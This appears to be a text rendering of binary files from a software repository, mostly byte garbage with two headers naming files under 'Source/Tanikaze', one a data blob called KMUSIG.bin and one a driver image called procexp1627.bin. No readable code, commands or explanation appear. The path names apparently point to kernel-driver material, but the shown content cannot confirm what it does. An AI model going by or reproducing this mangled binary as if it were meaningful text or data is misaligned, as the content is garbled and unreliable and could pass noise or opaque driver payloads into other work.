×VpªPø´m˜“ªL®[êY¿³Ð75R¦kb¼“¤fšùà.æi÷Ú°þÊ³©´7áÛõÃF|¼`AÚ ¾Ñák¿•Ìá¾ÙJ§.éqƒbÝâJ‘+i¾>>#›VþýgÌ—ÕFƒšV™x¦M”–_¡ªf)uËquÉFæ]zi“·¢»ò–1Ú¶¨aø|âT×Ëpì›ÙåàÔÓu¦Ð*1‡ÏrØmÍ—¯¼Ù~÷É–ì[PúgXÑÃ÷jÂ
9z`Ð˜.y=‰6QK	™3H§°›Òc66ÓñØ¨oUÝÔ/èöc®„šM&ôåe-ßôl—IÍY¬Ö³H¹iËŸ]9FgBm!QšYN£±Ûƒþ8XhóÓÀybuTúä¾uf–9ˆ™[ª<¦õùy´´ÖeX ®LÃÊbÛ,+ k0G³®C+õ	ºm¢^›¬ø¹©.›]ê'^ û+7<7
Í4›C[ÞTlw=úÆ O5ûÒÄHDOJŽSÃ¥p†»²³W².ŠÛüü+·—Q¨Ÿq&RîIÜUá|Ý”l
´}Zž,â“5Ìð…q¸Æ’= ðzÈ(!X•Qä‡uµH×“Io/W¶†Ü©÷ZNè/“Ýºª—ÔjW åíÁÚ•ß´‚^w©"	{Ý±*Bçûöb@3(n ±ñÍAøá*ñå-¬žÉ¯µ¢?`À¡}YµK5æwD3ä€FT¦»3ø\Á½Ûx¢&ÇÆI¦Ø“×«][ÁSnuüpÝ°f¨ýQÔBãí1‹:A_ª¯lvfÚ2¬Õã?Éž0±©èãžŽb#æù*ûã¿9#úÝcsã1—"2”¹,#D|jêïo|z6EW1@ƒƒ.S=jää-{ê¿`ÇéC<BA3PÖâl“Ä·î{knVÞF5|†Pj;¬µ1èºÂâcXm¤+¤›È+YÅTëYëB=|Æã¹ÂYƒF~ç­gÚØÒò­I¥“¬ó@:`û‘Ó >!ZÅçayj,­•Óaô§¼­hŠhp¼§)M‚U²¤›VœVNE%äÖ»ß’Y¥/.9ún ’ø*¢£æÏ9ÂÈ}û\&@; >:Ð§n¾n7 vþ @q¥»¿¾Ë¿©mxË[±%Ãž«“ìÄ™¤ë|¦õ•'?!ë§m&e¸c1ì­Ü~©GÀÓJ8¹/d$úÃñ1…ÝÜ}A»Æòw&?ìý(èMÉ›¨R:Vá`ó"æÒMÙÌpU¯Ö#b…ãYûÀ0ÃÇÇ§ó&¬™“äÉVŽ6¨T”À5úØèv€Ää?÷7/øy¼ÊÏ†µŽ´ïR—šHñiÆF§˜hÈ”µÒQ}¬xæGŸ¾’hÏ‡.Ð¥–BæNEö;$#~Ù
$Ç¸í³ÕNíÕAc—|¾å_&&ZIO‚bez´H¹–œE+Þ·ùÿëQ,ûEjƒJvÛNÜ·ÃåÔRµDÈ³]+b_ÆPZ‘¼Jÿ¥›Ê±‚1ÉSäŠr¼ýKñ­~¨h	ë1êN’•‹¨.êàNß¬ËÑ¡™	#ÀÕí£‘³îØ<¾RwÆÄ0-ˆ"¶þ+Á7ëîç¯QGâË@HÈ{	ê‹]‚I!KiÈ%jâzÈÀÁ½EV!õ ‚;ížZb‡HËy¨ë¥Q¡Töê>Ÿ6’È3,X…žÜÈüI»ŽG§Å7¤{Mìà›õg;Ï3"’XögÅ™”$Õ¦›úd¾¹7(·1Åãdã£l›°tG}áùJú¹™Zž“øÔÆL¦¸ð|‹†bG¸ìyôì8MÕ¢xOé—áàvé?&Qfcçs®H¿º× ç½Ä¯·JýAHe†2I\gŸ§Á©3íñÑ‹±éÚqGd»ÜpÍˆE–Ý±TXÞ4¾Û™‰&ÈØïßòÄ7¢çsþùù`ŸRc¦¹ð–
2lÑÕ¤bjÙÓ«¥ßKŒeæ^´?Èeé£îa8¦vÜGY(•´ò9xâ.ªå)¢éCI,È>Œ¼‰=é­^µtlUïŸE#¯úÔ?­¬-l'ŽƒGKo5=®ÌÂ™10¤²=‘µ¸b&‡†á––&ƒí¼PÂƒ%¨ôË¾#Ü­wìg±æÇì!çNÿóäX[º…:þúe5è[ìÃMiô3Ší÷ïnvrÁWÿøF6½ÈXg†ßàäç—vÉb_¤M‰J„(tI“ð¢ŽVå°¯hö¦étêì‡É Þ³ÝÉiGþ±Ï´Qz8ÉxM	.fÕÈÅ¥Òë­Ã‹´åV30ùÄ	Ñ©ð'º¿ª­F,L»ð} Ÿr¸möî_"jäd*~"Uúè›ÚJ>Á­Ï†É0LoH¡ÌJø\ÃY!ëÔAÙª|éëJ£\³18C4cÝ—øE¥6&~AVøMRéÅVæš.Þ½ÂÍ½Ø¾.@z ã´%TÌca?µ@—•?¦Ž§ÜÆ³z!]9ðË?¦¸NyàÍ.Àw~Œùû>Š²ÓAo9ÞÊØkB˜ç:{þþïqï0æb®ü+'×UZ(5¤D~¶±\ë²l˜ö*àIû¡A·ƒæ;FÔ¶Á;s„5ùA iúwø¹£P#=iníêö¢½BDèÎçá”óf'íŽ«°©»t/WøNwŠR·:p©m°—4ƒ¹'0ëºžQÄzˆ/³V®1†N¦Ù¡ ‰Ø”!4‘Ûj¤R^£ÏwK÷Ô8ê¾ÝÀ«H8 ÓBƒKÝ’M×ñqS8÷L¡îÙSµm˜výNèŒn'ÃÁÉâý«’¹ª×/êÍWbNÆÃG´Ë?ú]wÈ/33Ã2¯cpØÄqï(ìg-¹Ó›×¦¿8îêùˆ"ÅÊãè—S‡ù®±üÄZ3HNŸuWŽB¿®¥‘ƒ¤©ÐªÇß÷|†"[Û¯¤~ÊSø²¿ž.N˜ˆ¶_R7ØhÖSuvJ^ë´H¶U”iô ‰€^?±ŸÈ€ŸM’ëßø&Ë<9¦´j=ké/>Iïø¹ëåGh¾xŒ`ø¸†m€:µÈ)HK7°†è·‚µ"­¸¡u1å`UmEÕ~Ø>ÌøÚ²Še}z!šÖÁ|ÙÂ¥›W%¡G¸öÑ¥>1ˆ}‹2CË3·ªUd“Óo5š1]*/ibŸcÀRô—Ä«Úo°ž ©F•ßÔaÿÏå•ó´f<æpMË 8Œöð“ÜÆÄ÷¨Àæ9)¯s~¥»_mƒ 9HÉÓu­‹	Ö†Œ&Óv.Ž¿³:-‘eï7EPüþËñRñ‘ ºØÝþù§Œ5r¥x\‹'w­Çæ(^2Ð–+ÌÆóo‚ß…’âõäe  0¦"¨]ÅŠmú_Ùu9Œ&WñòI{•/Ë4NþjP“ƒîOA
l~NB5H÷pVŸŠ-¡Óõ_íâj!÷¦y¡àŽ^aŽâK—ÿì›å™e1‡æàblî‘IßPðì0µâØ‡©»ù·Ëÿ”\`…_Èö~5ÞnVsŠXXÐs'¡/¤Ü¼õék>vne‹*»¶+À¢|+ó|ÓÇéÌ»Dìs©GRh;œdg‘ÿÛ™°ÿ\Ëó“‘?ÞüÞIho‰ßË]¾ç¶áƒVÎZß·í¨Ã·{P:•Ù|%ÎŸ^ó0úL¤Bý~nÑàJ<·ñ/ ƒPÁvm-bã_SYò!÷Öß¦J6ï·êwÞ7*Z_Y‘í-?Ã;!úr¬ãWÆu6’÷Hg3ÎØªðýOJu;Æ3š÷ö³un›TF0A8V÷KKæO÷dDA5„ö>%Þ¹H·Q.kV0Ñ][N'&dŠê+³Ubù$–bÑxr"U«ñ@¦Å&MSêÜ)d	äØ¹~È<U2c&GÃØ^éì½	Ú‚qtÞ¼:GºS¹óØáôè`G¿óŠIÑ.öDjÚû<n·¥Êuº}#C2e9[ÜËMyì%¨7rÒ$N¡šVj‘{Áš¥íœ…iÿ@á‰N"ù¡&ÔM=!rN²žx¨z•Ìcdt>L³D%WFw·0õárKƒóç®ˆ¸×»”µàÎ·::X6[æ3#jo
í+ŽÝ´…ÀùÔ,rÀ×´|©R#”!´db /¦Î@DyþûòÆ=R§¯ƒƒçdæg-“@ê1‘âm‘
èÿ9WÁ•Ór»ìhcÜ8bEEäpGÕj1ÉpÙN‹?o¯Ö—,ƒ­Bõ«àãq {4U8ót$50!ã6Pv¾wÃt÷4ŽÅ6ØÐÝ/4™Ê‰ÎÍ§ Ÿ‡—Ï~D?G’cØ—šuV–®ÃßmI  ññjå+þ“àÃo‡¡vã;SÈ{&ñK4Ç%Sp6jAÍUÄ&yÜ±‰uz;iê½S¡±Ä2!áÙ=à«„‚¦ü¾]Áb!
6ÌQûÕî¡dï®jõoë‹¬¼ÈÂ]¾ŒÔ†N;Ñ|ÔÏáæ?Äum¤Ö7re-•”R’;Âû+|U‹ýd#Ñ{¸ù(sss\ÄÅBg4Ô¼>¿ÉÛÕÈÑu¡[ÔáTxY—'ßÖÉj|èÉ ž>:ÉË3<Ã`zYÈ*Ø7Í0›§×u’Û‚ôbm>¦Žpã±šPv;Š=÷)émÈmnáœ¼óuxfß~B&•×% ¿¹Œ×ø[±^¶¦ïörVujÝœQe"†òÒÙº9t\lÅ4Ží^U9w;ü
¾—ÅÉœB.ŽnU³hmt §¡÷œF`A¹+Á«ix¯óÏW{üç¹ÐvºJÿ¶bf„b·ÀÆ¾ú`eÄôhf6e…lÀåcB`óQ”ôy¦
ˆ•üßËù¿y¡Z†åd"¤RÇÃª£ƒ§'e\ÌõY'¡q½Î‚1-Àƒ7~òév´e.Š]MO	ÒÃ&Ö¦UÇŸ>[ŠIqòKµÆ¶IÔÊ\ÂQ*ëãü‹]”%ñUb²–ý|cUeQµcÀ5;×)àIÐ;bñ/a<wÓ€QYb×ËÜ¸ÒÜÛñ(Â7[Ù,Kà“ý‘[>¨óíH3€Ê‡2.WëÕ„šÄ5¨›ù‘36e)¿H•û8ùéRB­.LnùCau,Áß€¥áxÆÇýO^Kvg·3RIƒ?)sHôÍ÷£¼?Hì7“¹óvlþÏj©ÁÞÎÛ0 C£YB;Ñd¡Ð“I(EÜÔ*Xçwì¥(ýœæ»Ùˆ‡‹œÿ°E¤Â|@S…!3vïš†¯€Ða+ÒV Ð*ÅÝé¾–Ã<Æ«OHK*Fe-eEòâÒbG¸Ì´fÃ‡Rÿm‰ïZæñ‹ó¢ƒL|p±C¯ÁsN'ê°Œ¡(hÃà­e=ë‚¶uZØi‘@ªÅZÿ³—cƒ*s¶…Ð'á¨Ð&¾ë=¶xv…—ˆ…P5¿-Wz€µòse;&•'“>%A³\@°}¶9¥Y/6¡ÞòÅö0ø7†÷i$'âÜ]ª[‹ÛÖ+êˆUØ—æÓÒ¬Ò×Ÿ5°¤YÄrjã$D1wãœ‰ÏÅ­,rwüuZ¡¿'7}!A/¼¹x²  ß·‘g´¾0±)lª.y|š.ÍÜ"s†fä>ªI¢|¸d—1 œi9è‹÷	LNd2cüÎ¿ˆ|^Yž®ow)´ƒ×,–/ÙjÈÏÄÏ•ŒnH‘“çYÔ,LIcï°º#v—êØ¸Ýà6Mã‘f?2”½@/fzçåŒ«1`VõŸœ)Yb]Ý­œU;V-W¯GiêÁ»Ò=æO—ªéŽïqç'°`XtÍ$í´Ü	‘PLŸ˜¿YµÏr§Ñ`Å]ìÎëšmD¸@ËºÝzR–æ¸D§ŸáØtC§æ‹ª*vEÔ -a~Í@üˆ½„„B^–Ð3ÄdÜŠg†â!JÉ.ìLHRBb\>mò1v–éxË ¿ƒDè¥æÐb?ºÐÞ» óå'ë¢¶áÃÖíb¬J/Oó3G“’xlÆ'3^ËG<wyïÐ0æª{@àï&ç
ûæ:¼dö»?øË²#¼Õè}ÏB§äÑ&n¦Mëg–
sôÁl™8tt:!µ÷´#*rsI5ƒp ñ?Þ+Ø¨±l±Àfëv˜RÒ¾îû‘þp"—Dõê“Z2 ÌÔ‚›Ýßé“-#è°˜U¨®|Õã~™WYiî}3®yÓÎã9§<oAÒïM3œVªØ'  z“"}×Åû®A¼)Þ²è»ž±"ÏlMÿÏ¸’þ(­Î_|ä?8Á¨Ùý*¨Gí÷J[~áÆ,«Ömeqô&ï¡Ÿ¢ü‹ðÏbçËõÎùÒÒ‡g†1.1Eæ3„q&…ù÷-W"žNÁaãnÙ¤¶5ù0 î¦zb¹? 9öžÒZØgÉš…í§ÔºiÛÅ	¤žˆhSiAãìÙnÓÌðÓræú±¯ˆL¦ í(`SXŠß¥ãáy=,øÕí$"s:,ú]³i¿ûm'	¯ì-³cŽÈ°ÄÝ6fYÀ‡Y]ßiª·*†^[å°skDY…È/q÷&=Ž»Á…)8@ì¾êóCà
÷_Ób00<³{|Êf>e¢•‚jb÷Ž£[¤k–`®þWòÂ]—–ž1ù|¡õÅ/
¦‰9/…ˆîkÂj©ZóÞo-]•§V„	b¾žßpšVÍ¿Ûšt©¢4£ò¬q¸UòH¸$ÜšçÛð‹®æëiá™Ø¼«¼S¶Ì™_úÖ­«ò	Ût!Ý\Áö“J»Z"xrB$µ‚$™f´ÍË}jÎÖ.íákx¨¼OJsHÑòÆ½8â… "ÏÄ£æ|Û©¼ºŒ«Ñ‰ë%ÓWEr„bµ&B®™ðv³èFeyâ/ðÐ®–> í#*ÀÈÊ#pFÆÏÖØ*NnìMiWiTŽ°ŠB€º›Ãt·çÊîdÙúüëBíŽX„ƒêKð1g…†Ã”þ¼,OUç\äs/[Ã¨ËToöi÷†ý8é­åÒž½¹o9ä‚VšOÅì]žú‰ÕÏœõüõóO—IØû7§‰rø<f—Q¦×Ò 8¯Žÿ±?FønïzrüB‰’ýí–ÔÏ	Ç·KW>vLÚ4HW×¦×O"ð?XÕ/dÁ%TÈƒ”ÔV‘cÑË–©Ò“H¾E°3™£úïáÄ¤%¤xÊÍH ìšN¾3î’\Æ®‚æÝÿ Á4<jAËÎTþ/¥KF¬e½2;jª©ß¿d˜êXÊÎ©~ªÑ'*Iurí9û¯(;Œ^Ê^`ÊØ”B†ÐXfN@Rƒ
$’X<ý©üÒQØSi¹¥þ-VÁéªaÏ–©Š|ëXASz·r°«åªóÚ²˜ ¨#mÇ¬|hG‚%Åu«O	öžø` E—Ÿè¿IÁ%$B;ZJT<¡m§Œ(lE:&{HYÚg¦‘É¹%Žÿ?kÁ7çú´Q3‰a¬ÔI•µæ#gñÕ4%’µW™ô&¬Øsmeä¬×_Ü²þ)Eue¿ÝWú’ò½¡ê)L1¾¿ª±ó=-œ‹<“~F)Žë)»=\ºˆ™)h
º’Ð¡0äðñÔ5µàÖ+“¾²ã£u	e	~,¬êr%ò	Œó&Õ×°ˆð
ãñ,ìúò¬Çrbi›ýk2ÂY‘Uál$Ö•Hþ2\_V÷&ã­{gËI…¼~÷ÚÖ#	ÈÊ¨SWZRêj04Éêƒ¹”‘’gIÀß¢/é)#¸-´Õy§ÇÎU6OBˆˆþI-.f,gkü<¸'{‡èîúDÐ½ë·¡v“v/šÃSâ@ƒlCèÚßâ4ày~ÈÐÈÖsK>»é>‘-àˆûŒ½3MøLÓ¢'km¡_&’óæ!æª´msíNw”iƒx•²tC£T¿YïU<äøvkç¸«|u#	ÃÑ‹*¥ïq
Â“Z–?°øê±!Q~nÝÄœ<É|sNÆfµêÙ.OËºP¬²H²¨â±d¸GöjoPèjÒâãVWe´£M8#çç­¼é-È¾çÇ¹P9Ë>øyKÃŒ,©oV­öL¡¶¡Üòy©cŒiþ®Ûz´	)CÏAè¿7 ó'¶eøúØßçùü@UÒÌcÎÛœÆ\Dòp÷ôbeŸ6•K­Y–]öº¼Ž®‰ì£¼gûB•Öµ7°î”Ì©â›Ym²JÏG£¹T¸i%Q/¡ch|\”™:¢ÈíÞ	Ô„{s-¤wÎ2)•E’ :ïÇ2˜¶›Uc„œÄy…A Ið6-”x>*Ã…‡Ï-}­üòF²}¸ü›HÿË1Ü×Û¤æ×@Bì¹¦­ ºb7àT,½t²‹²2ÿø{ŸdïÁµþë´bâˆõsLÓ£»ï·ÔßN®jwgA´™%è7»÷,¡KêeG`÷“[ =ÿõù?9Lü_ã2gfÂcpÕxŸgZVh¯û¶<Õ‹äŠ0­HAk·4>ÎëkHK²ü¤þµ·´eùƒÇ9’Û–¶!w§'©M•%ÿãP›½Tã—šíVG³Åêã0á›º‚ðªº©mÀ"6r¡+Þ•Šœƒ•Ú­«Ü+Ó‘v¼×ÿÆ	÷EÅ­.a£C:u0æpÇŠãÞÿÛ	ã!3W$s%:¤ºÐMX”|wÐ©Ú@¯IÔ–±?xXí^PêYN€Ù­:bt½€¾m““ôóŠ.¤µiX…S“û&‹>à½¶ÔÑ’vç{{×)F“œ;	s%Ð>8XÛž¿ýÓ21q×­¬9,gÔ}¬šh¶áç“MÆq¼`ÓÆæ·5ª@6›\‡Ò'{˜tÌÀÞ¨ÝëwõâØ´iá ·bP±Aˆ–ü¶]Gcä0ª¥5÷Ë`}sV¡?~(\Ò%v¦îœ1\ÒS%Oyû¸†>|¸0Ó÷Nü^P|M©+9’NÎ4TðKÚô­`P•T ‡”Ûz v”ö¡#D‹N“
{ììŠrÕ£Vœ6'Îš „‰”¶+Ù˜óË¿ŸÈ$¿Ð|¡¥;'m¯:I±Æ=5¡#ÿ'Ž)‚r£qLö6( ªd‰w`¥ôàõ–„;42C%ÚY<#Í^Ör¹js‘jôuU—^,Žî{ÒH¹œrr†Ûñ®‰Âg‘àŸWDsçG¢¢¾MÉ ‚YcV‰˜ªÈÚ:ónÒtìº¶Ì+–áx¾²5+c‹rMpÅõž^àêŸ·;lk#YÚ3ç›þzË]¤è ’0ŠÀ&ãÂíLãf5®Ý¨vC4­i,‚¤S ¦–§ðW’¬¨¦zJÇŽpqÒÕ@žóñRì×PyÏâ%Â‘~³€XÂ•ZSâI%Bží‹dUØy5{ ëPm69Nš†ÅÇ‘à!'É“Ñ7eaËTü? IFû¢$SÓOÉïæŸ<(’œö‹èx®,•JÅ…¯YÍsðöÛÕ£ ´1ÇÑ3Tn’Qþã<Ó'>©x®œ‹#yÏ)wQÙ¿³¸¬Ò­áEYZÅº–€K…RÅtºñBë¸ÜöCwcãv—OÚ~ÛÅ_ÿg<DO á¼
ô8sš²I÷œš»OäP´mPr½Ø°É*]mbOÙÐ*‚Ì£Ì2>lAV©¯³§ÅrË—ÌHäÂÎ&š‹hN*5	u•‘T‡¶Yà)s2öEÁÅV>	I³Ù¢sœ€O:<”LÐ™¯CR
NaÈ}Ç€	^¿V.‡˜ý§^üñÍ+¦~wKFô{´·`ÐÊäHUÍ>ç¼ÕUš0€<{TÏZHÛ0÷ž'·ò5¿£^³»ØuÙ±š…(³qü,F[ªiúêúó”ÖA~J¦_–ÁõÑª¶_ÿ¼¾ÏZŒpwBgHäjÉOJÙwATÊÀ
```

`Source/Tanikaze/data/KMUSIG.bin`:

```bin
°€°7ïIJ»•°zæÃ,]ãqq«>Vf[æÒ&S–>§˜oœƒÖ°ÝükFzQ šÊy,°-Ò·}eÎI8×ôq^gÉ0¤”^ Áûr*œ(®ò™aÃ7p}‡?š4FjB\0K$1g^í‰„”Œ¸bÿÓïV`Í´µý%ë‡±Þ7—*óÙÖ¯>ôÌwiá
mV?‰SHèæ/Œ0£8”ÎHˆ]àì
```

`Source/Tanikaze/drv/procexp1627.bin`:

```bin
°€°7oÕ1Ä•°zæ«OMT¸+aÉ<2p§gò/jJ‚ƒ…­¬È½èb
©Æ¡šðd{Az XFÌ=%ÁÞ>ÿá8‰´Ý{ß¶#d•ƒE•bf­·$•º²ÒZÓ¦.4h±ç
Ï0„ô©Qž›!\PõÀJ¨Ô]òË‰D<¾Òùù·±(´õsN‰J¯ÐOb[Ò¿nBþÌ6½[¨Ð3¿æ4€ÛUéÝY©ÿÁÓÑïX*­íˆƒ!¸2P2[¤´"6îã¬Ô‡!‹¢zÂŠo‰EóÌ–o'h>½Y€í¯ i}™ûžXOÓ.sÌìOIïôŒ¦…rI«¤è½Î‰Jß¦];sé_sw«5kê4é³lÍÆ_~£5Qx…¼—G”Þ»éÅ¹f|Ý›‹¸«a–°âò”aŽý¦ŸKå2FKZÔQÃDq»,MÕH
ºCl
¸<Ží	iÁÛOW#¼ œå(Ê_V?×Bl‰(Ú€­ññ08©¤`ª2ÙT3®?2ŠD{9cp¸Á©¶a,ÅãŒz$zn©s~U˜;™î}+çÿ:if×tóój’‚#è ‚¢T@åŠYé«u’îŠ–ì¶*W¶V+ê;ñ+UûÁˆ{s¨6RvNëÂbÑBÍ>Ut=?¯T=²ùÛ`cÝõý‚¬©/£…eKî¸]’ô{¼š#þK³@éÕàH]ùà÷¬—ƒ9:Ë·R˜!Zñõu)î›GÌ?ÜG„B6ÿ&M†“j
^½ì–]
»Ö?ÒX(÷O-w®Å¶aÇ‹é£Ã~¥*•Þ´=;ùz('?˜‹¡·«$øoŠÖ¼úPâŸïoR;|aÅÐ¢F†£ª¿1~¥SŒî=1O*þˆÆ_I@!8eté^dˆ½äÝb¼8~Àž—ïÒ¯Ç­z(Z§j²ºÊÎš_ÞÖ!:µÊßL†j˜Õ7Iù3á¯¶qx¨›w2òìpÛf­M,œÝ‚Xu»ìíX”;%
èÒy§˜StYe÷™"ø>khb.®)ÕuõoûDIŒi·‹â(á¸-ög‰M|IæÀÃZXÍŒµùPüH¯§˜IcŽ˜d²¸à$<óÂñ;z²cùx-bƒóìûCüe7ôÅíÉÓº-i­I4˜^JÇ½é
è/ª‹@+½z5èònv¸¸³`ßqáÇþ
#~^†‡G\#¥q	RJgš±ã£}x@;°ËÍlLà˜ºAõ„,5)x‹dµ1hŽÚšUÂÍo¥)úœ€ÌJ~E÷˜^ÄF{ÀŸ×gÖ6ÇM÷yeþ0bŒŸ¥.÷¢Ô½Š×<¸u/>£§rÍaôèþ|¬Ø6œÖ¯s‰
…
U,PVAõ¥^„„K>`³…ºe¼ù¥­UuÙ™aÏ$~Žúºjð•è­EÊÂ7ËyèÖ±Ye6]Ã f$ft±Q$Cm ×òûv2Á0Ú#lÃàÝ•P¸Z/üth	áƒ÷Å7,lWa’­UÔs|„d±×È´Ý—9G*ß-ÞQ0vÇb?íÆ½e¨•¼Í«¶‡<!·É¡0­<Yv8¡	=DkìÞ»Ru9|Ip†sÍZ|Û$©#
#¥J(Õµ &ÜŒƒm&{+kåÀYhfùáW*’ƒ¼E,å?^é\ÃO’¹éºf¾¶d™Ò2¬õºMYápy–Á×dÎv0¶QæÞh4‰T°1ðH[™Ÿ{Ï,aÛ.^Ì0°Ô9ƒ
Adbé¥‘ú`”-2Glk½dõð†ÚlN+TÑN‡µ/ûä­îï¡ÈrË"@€]¸Q®¡ˆÒh
xxÑœÃZ )	ÕÂ©—Ü:·hlê. vw=ôT+™²œÑ†qù@(¶±öÜÔ;¡O‘NfSøø´ø,¬™ˆuõ-jþCª×¹YEtèòï¶¢—F™Òü3zDë"jBê½`ª:°AÃïQfÞ¿vñqü#ytÞ“Æù­|6Bj÷ÐsOg[äÊn¯ëžx	êò°Ap(Úý¬Öž¥¦ŽÝžº RwàNPÄ¤|‡<Zº3Èž9Š”Ût!8K²”°ÅE––¹öÄð<Þw[ÆÞaŽuN*åkEDç’ÿ‚·"3¡ˆ] uòß075¤ U£Ø{×ZÍNdã5±d{úüKz§÷¨û¨=`ˆ%{x¹teðWVŽ²G¹a¤… ñ5ì‰l¥ff
)Ó–Ùþâ´X!0+g¢#¯×Û¾ñÿe‹øÏ÷÷ùé(l¿÷áú=Y,þò¢>V¥D¡ñEå$V0cICÛ*,FQ8?Aú™ÉÖÉ~LªYå(4ƒ3aÍm«Ó¤öÖ»ü¬X
‘Ñ¦NàÑrÆý@"»+ (	hÎ¹˜i÷´…ê õe^¿‚ÎzÜ)ÔóA2Ñ‹4×ï]òµYP	
ãeŒÏg€íi2f9Þ _þÂ{­V¨—ËÌÙþ•Q¥‰‡kfã ü®_š|ôqyê+˜¡g¼Y.ÊÞ•Ý:"²Ñb[tqja¨VÐÜ6Þ~ùÞDA¯«W±‹¢>&4¶™c?˜IÜŽÌâRjQ»U¤qg>I”®¦)ë§kN†’dZa‘Æ§ÅhË¸ÊMïÃXå¼5÷J’
<¹z<íD€Ó•¿nŒJyQEöŒ1Ób>J_C¦?ßám¢*<Ÿ1²«ãp6ÛåŠŽ#®‚?ªü5áÅcÁ3É¯þ>1©%8Ò 7"ããØÏ:‡—›Þo¢BôÛÁ7@äð¦6‹>T¬æþ tó&è(²jZ³Ö)ÙAyÌC ×ÅÝFÚÒ‰˜„‰±Î?Riu/1'S)ãSF¨?-“ÔÊÃ¡zýâ“7ÚÚmÚma¬Q#9°=Ù€FYoôæ*\­´‰¥MÌÓ•-0'Q‰lä£2¾Àô 8Ge”Ckœ52¤ÍÐjp<Ž§·P¶oØ4D­q!l?'ÿìì5ýûM¾åÍr{5œ”+Àœ³ñe”ÿ‚¬Ê›!CäZU	ç¸5×6¯Ýö%SÞFri¯¼û<•n£ÎŠ_`3ƒâ4­DMü*8Î‰eI‚LÚ‡ßc°ÎÇÉþŸM$ÿuƒÑjo,BÆÞOapóÇæÁA÷—Ê¨»e;U½ÝédÏ£¥FeÁŒ‘Eèä½n°ôE¥ó«A™zrDtn?)y“’¥r5œÆeÇiÖ^hÅôžE³(@ïH‡¿¸…ObêM¼g·i‰ÚûÞ8ù&9ÀanŽ>r¸ JavuÈ©âCßùÖšÔ¸(6©”æ°"@çÂ½8Ÿ¨¯VŒ4 |øfrhÝ¸EÑÿV‘ùKD$LŸ°>ykâA2knFç{¹> /J˜âLÈ;©ÈIâäiG¡/ê ¥¾1D«
õ¿#Zã’MˆY9uŽ[)i¹õçýƒò!Ú¶>…~WŸE¦e#pJ.còŠÚàœÂ)‹’¨¢a»&×Wp¦æjZ0¯ñ$Á[ïW‡»Î÷ˆÝj%GXFp%ò§æÎ{žšC.·vö‚¯':l´ˆái)@Õž€lHƒ<;¦•JÞ+á¬Fqa¼ê¹§ÆÕmlP¬ySË‹N¡™ö•h9Ô+œµÓñkJ?¤ ’Ü¢W‘dQfS5êq)8µØUÜSe³R¾iOD^ßdžDÙFßgS‚Àá¯ìƒ¯Á±àRèäí{Ã´‡ðÑ¬¾™YÇŠZø’Éúä5Ë7Ð»˜O£¥*^£¬Ú]g”B˜°‘û'ÜÜãE ƒ <²S…c0M†#Yà 6™ÒISª(ß7#°âkÎ•ÄJë—DàuhG}4]^wÌÔýUºüeIþêªs†rÁ	fÄ?¯Å`Ó5Î›m:ÝaU0:XiJ9;¿¾¦ˆ(±ÅvöjÞ¯ÑíKOÓßÑ2GýÌ¦Sdü¿\¡H“¸Ëù»´Ñ&1b’è÷ôX¡Ûžc4å{}#aÁ%YHLmÁ»¤oCRiÑiB£ËK{‚÷Oò6ztª‘	”%4‡æí†å/+ÑùÈÌ'Â o=#›¶'[3ß«å£Ú?F×9U5L“T˜<–J¾L¡|\CÈí;ŽìªGÝâBÉMY™,vótæ%â§–=6^˜…žBk<F ©©.|Ô^ÆpêÈœ§²êãð ²,†ßoµGÇˆð>ÍUq{_Ã‘ts0—»©õ œõ’>°ª"N`ÌXÍo\”l`m6=ªÇøŒÏšG£q‡P"xÀ“ûíZÐœe=X±ìCæ+cCTÒ2Wz™ ª:ÈÒ;“ÔÝ×Ä¿Ê´ nz* ]JDFQ¥¾>73ß…(å±r´€1Z—ˆë•±öh¦C9îU¡Bõ
¹šÁ!§«q°W6‹w¾³ägH4+ìŸÎ^e_x±eëopÞ7tcò¤\8ì/À
Úà6I?K0vÎÁ²bçzÄ3úöÕE@Õ1ÕD6ˆ-v
ˆ@‘Ft¿î¤Žˆs€iÆñ?*˜Øc´x2Ä¶‘°ËR†-,OÛÙ‰7nc±@ŒÉß˜4?$ÈÜM@³Ž²õ¯7aŠBìOöV¯é”`)-Vn–}Kí5{·Ý”Z°3o€ýÑ©Ø^Û'SI2‘RÄ¼s-{FEŠ£Ó¨“ó9—N9[Ø"Áê"†m
¦ŸtÕ}ž”êok8›£…è«£º—‹ÃúJ'D¤{ÇrŸ{Ä‡_K¥q\"õ"Çm3\€¯]Ö_|ýíè/’²äê´Y…s.«HygBt.‚Fß½ã†™ŠkÂ^ážªÀÆuŽœ
ï “JvjgrúÝ¤ï#™SòæUy"8
+†ÄXõÿÅò$ûqLýEF˜{ .µÝ|Ø6l²nì°òºA‹ÓGâG»¼©1\Åª°\½Æár1M5 éZ¤¦ûUtÍÒ=•H«qà&;K‘°(ü/št÷kJsóG0s–$ ËO‚y¼{%ÿØ¡¸ËÁ¾¤#»®©—‹]w¸–\èÝÚÑ•v§r!òAîëŠ¡œ1ah8PjÈŒ"M‰Á¡àqàÎ¢ã¾|–Ú¼BJ$Ï6EjšAÂ`îOïÆvë=W %ºÁß£ê‹ÉÌyl­Ik½žR%<ƒ|úééh
¬wª;j0Èû\¡MÁŸÂZù¡Xè­I ÐÖ²¹3vˆÜ–?³¾Š€Ä§;a/µªZ…üÇž—;:Ž`š}³ú¶°Ã¢fîðåFÏ7ÊÍ~Ö’¶Èä‰ë{yªºe“ÏŽ
¦í+àß¼æ5bUïƒÇ	’PÆ³Y)ƒ)îg‘–‡{ç"Ÿí³V¨ÚqÃÿ;qÑÀôb¡;œ¿ó1x÷«DµD){B³é0 ù+°Nj³Á‡ª‹VDc‘Ô
ér¶zŽ°Äùä¬ÿÚø„•bülÙ—¸öè¨\r£ËÚ*Y½&Q.HõM¡ìNn©¦A8µüûMU§£é—”Uó[¥Âkµûîê.S¬#}BoœUýUZþùéåPÊT©ó…š­¼…ýÄK”&Ìmÿjð.Ía›úÖ­ÉƒPAp‚ó½yÌ’Ò6ßVaÑsÄ‚ÊÏzÊÿÕD[©¶Ha%èñÖáæõh8­¯¶Ÿó‘–<]â‹¦Ì	m:!îô°%ÀüNØŸb‰L¼43¼!¼š/N<‘'°™ÙQ>þfæZÖTýƒˆ>ìr¢ñL_èQðÃ!±6·<y¯êqñ•¨±ëœÜýPXÝš[.½_AÊ«¨U¢ä`gðA¯¥ÉƒÎ”(Ú¯9WÞÁ°ZzÄ(¹—o·Æªµ_ÌY‘V¡xA